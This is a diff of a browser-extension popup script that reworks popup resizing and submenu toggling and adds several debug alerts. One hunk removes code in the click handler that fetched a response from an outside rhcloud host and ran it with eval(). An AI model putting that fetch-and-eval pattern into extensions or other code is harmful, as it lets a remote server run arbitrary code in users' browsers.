@@ -43,6 +43,7 @@ function activateThemeClick(e){
 }
 
 function activateIconsClick(e){
+    $('#popup').css({'height' : 'auto'});
     var className = e.target.className;
     sendMsgToCS({
         action : 'CHANGE_ICONS',
@@ -51,6 +52,37 @@ function activateIconsClick(e){
 }
 
 function activateNavClick(e){
+
+    $('#change_navbar_select').on('click',function(){
+        var position=$('#navBarPicker').position();
+        console.log(position);
+        var distance = $('#myColorPicker').outerHeight(true) + position.top;
+        var heightToSave =  $('#popup').outerHeight(true);
+        console.log('DISTANCE ' + distance);
+        console.log('Height To Save ' + heightToSave);
+        if (distance > $('#popup').outerHeight(true)) {
+            $('#popup').height(function (index, height) {
+                var newHeight =  distance - height;
+                console.log('HEIGHT ' + height)
+                console.log('NEW HEIGHT ' + newHeight);
+                return (height + newHeight + 13)
+            });
+            console.log('POPUP OUTER HEIGHT AFTER ' + $('#popup').outerHeight());
+
+        }
+
+
+
+    });
+
+
+   /* $('#navBarPicker').on('blur',function(){
+        $('#popup').height(function (index, height) {
+            return (height - heightToAdd)
+        });
+
+    });*/
+
     var elem = document.getElementById('navBarPicker');
     var colorCode = elem.color.toString();
     sendMsgToCS({
@@ -72,22 +104,12 @@ function closeFn() {
   window.close();
 }
 
-
-
 var isOpened = {'change_themes':false, 'change_icons':false, 'change_navbar': false, 'change_bgcol': false}
+
 function click(e) {
 
-    var xhr = new XMLHttpRequest();
-    xhr.open("GET", "http://nodejsfb-hiko.rhcloud.com:8080/", true);
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState == 4) {
-            // WARNING! Might be evaluating an evil script!
-            var resp = eval("(" + xhr.responseText + ")");
-            console.log(resp);
-        }
-    }
-    xhr.send();
 
+    //use this to open the div at the good moment
     if( e.target !== this && e.target.className !== 'categoryTitle') {
         return;
     }
@@ -100,26 +122,29 @@ function click(e) {
              divName = e.target.id;
         }
         var elems = document.getElementById(divName + '_select');
-        if (elems.style.display !== 'none') {
-            elems.style.display = 'none';
-
-        }
-        else {
-
-            elems.style.display = 'block';
-        }
-        document.getElementById('popup').style.height = $(window).height();
+        $('.submenu').each(function( index ) {
+            console.log($(this).attr('id') + ' == ' + elems.id);
+            if ($(this).attr('id') !== elems.id) {
+                $(this).css({'display':'none'});
+            }
+            else
+            {
+                $(this).css({'display':'block'});
+            }
+        });
 
         if (divName == 'change_themes') {
-            document.getElementById('popup').style.height = $(window).height();
             for (var i = 0; i < elems.childNodes.length; i++) {
                 elems.childNodes[i].onclick = activateThemeClick;
 
             }
         }
         if (divName == 'change_icons') {
-            document.getElementById('popup').style.height = $(window).height();
-            //   $('#popup').css({'height' :$(window).height() });
+            alert($(window).height());
+            alert($('#popup').height());
+            if($(window).height() > $('#popup').height()){
+                console.log('tu');
+            }
             for (var i = 0; i < elems.childNodes.length; i++) {
                 elems.childNodes[i].onclick = activateIconsClick;
 
@@ -127,7 +152,6 @@ function click(e) {
         }
 
         if (divName == 'change_navbar') {
-            document.getElementById('popup').style.height = $(window).height();
             // we adjust popupsize
             for (var i = 0; i < elems.childNodes.length; i++) {
                 elems.childNodes[i].onclick = activateNavClick;
@@ -136,7 +160,45 @@ function click(e) {
         }
 
         if (divName == 'change_bgcol') {
-            document.getElementById('popup').style.height = $(window).height();
+            alert($('#popup').height());
+            $('#bgPicker').on('click',function(){
+                var position=$('#bgPicker').position();
+                console.log(position);
+                var distance = $('#myColorPicker').outerHeight(true) + position.top;
+                var heightToSave =  $('#popup').outerHeight(true);
+                console.log('DISTANCE ' + distance);
+                console.log('Height To Save ' + heightToSave);
+                if (distance > $('#popup').outerHeight(true)) {
+                    $('#popup').height(function (index, height) {
+                        var newHeight =  distance - height;
+                        console.log('HEIGHT ' + height)
+                        console.log('NEW HEIGHT ' + newHeight);
+                        return (height + newHeight + 13)
+                    });
+                    console.log('POPUP OUTER HEIGHT AFTER ' + $('#popup').outerHeight());
+
+                }
+            });
+            $('#bgPicker').on('blur',function(){
+                var position=$('#bgPicker').position();
+                console.log(position);
+                var distance = $('#myColorPicker').outerHeight(true) + position.top;
+                var heightToSave =  $('#popup').outerHeight(true);
+                console.log('DISTANCE ' + distance);
+                console.log('Height To Save ' + heightToSave);
+                if (distance < $('#popup').outerHeight(true)) {
+                    $('#popup').height(function (index, height) {
+                        var newHeight =  height - distance;
+                        console.log('HEIGHT ' + height)
+                        console.log('NEW HEIGHT ' + newHeight);
+                        return (height - newHeight - 47)
+                    });
+                    console.log('POPUP OUTER HEIGHT AFTER ' + $('#popup').outerHeight());
+
+                }
+                alert($('#popup').height());
+            });
+            
             for (var i = 0; i < elems.childNodes.length; i++) {
                 if (elems.childNodes[i].tagName == 'SPAN') {
                     elems.childNodes[i].onclick = activateBgClick;
@@ -161,7 +223,6 @@ function resizeBack(){
 function run() {
   trackEvent("iccl", "func");
   document.addEventListener('DOMContentLoaded', function() {
-
     try{
         $(".fancybox").fancybox({
             'showCloseButton' : false,
@@ -170,20 +231,13 @@ function run() {
             'beforeClose': function(){
                resizeBack();
             }
-
-
-
         });
         $('.overlaySize').on('click', function(){
             changeSize();
         });
-
         document.getElementById('popup').style.width = '300px';
-        document.getElementById('bgPicker').addEventListener('onclick',function(){
-            alert('ok');
-        });
-      var closeButton = document.getElementById('close_btn');
-      closeButton.onclick = closeFn;
+        var closeButton = document.getElementById('close_btn');
+        closeButton.onclick = closeFn;
         $( ".selector" ).each(function( index ) {
             console.log(index);
             $(this).on('click', click);
@@ -192,10 +246,7 @@ function run() {
       trackError(e35, 35);
       
     }
-    
   });
-  
-  
 }
 
 try {
